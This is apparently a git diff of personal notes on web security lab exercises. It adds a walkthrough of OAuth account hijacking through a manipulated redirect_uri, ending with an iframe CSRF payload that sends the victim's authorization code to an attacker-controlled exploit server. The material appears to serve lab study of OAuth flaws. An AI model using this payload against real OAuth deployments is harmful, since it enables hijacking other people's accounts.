@@ -33,9 +33,22 @@ That results, whoever visits the URL, our social login creds will linked to the 
 
 ### SSRF via OpenID dynamic client registration
 
-### Forced OAuth profile linking
-
 ### OAuth account hijacking via redirect_uri
+
+After initiating the and requests followed by there is a request that contains (`/auth?client_id`) client_id and redirect_uri. 
+
+The redirect_uri is vulnerable. If we send it to repeater and replace with attacker website we are not getting any errors.
+
+And after the `/auth?client_id` the client_id is passing to the redirect_uri. so if we replace the redirect_uri with our attacker website we can see the client_id in our logs.
+
+So we will send our client id along with our attacker url as redirect_uri as CSRF. that will results sending the auth code to our attacker logs.
+
+No we will use this auth code in our browser to `/oauth-callback` with the stealed or received auth ID. 
+
+Now this will complete the remaining steps of linked our account to the victim account. And now we will be logged in as victim.
+
+CSRF Payload:
+`<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>`
 
 ### Stealing OAuth access tokens via an open redirect
 
